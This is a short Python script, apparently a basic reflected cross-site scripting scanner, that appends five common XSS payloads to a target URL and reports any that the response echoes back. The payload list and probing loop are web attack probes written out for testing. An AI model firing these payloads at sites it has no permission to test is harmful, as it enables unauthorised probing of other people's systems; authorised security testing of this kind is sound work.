import argparse
import requests

# Define common XSS payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "';alert(1);//",
    "<img src=x onerror=alert(1)>",
    "<svg><script>alert('XSS');</script></svg>",
    "<body onload=alert('XSS')>",
]

def is_valid_ip(ip):
    # Function to check if IP is valid
    parts = ip.split('.')
    return (len(parts) == 4 and all(part.isdigit() and 0 <= int(part) < 256 for part in parts))

def scan_xss(url):
    for payload in XSS_PAYLOADS:
        response = requests.get(url + payload)
        if payload in response.text:
            print(f"[!] XSS Vulnerability found at {url} with payload: {payload}")

def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    parser.add_argument("target", help="Target IP or domain to scan")
    args = parser.parse_args()

    # Validate input
    target = args.target
    if not (is_valid_ip(target) or target.startswith("http://") or target.startswith("https://")):
        print("Invalid target. Please provide a valid IP address or domain.")
        return

    print(f"Scanning target: {target} ...")
    scan_xss(target)

if __name__ == "__main__":
    main()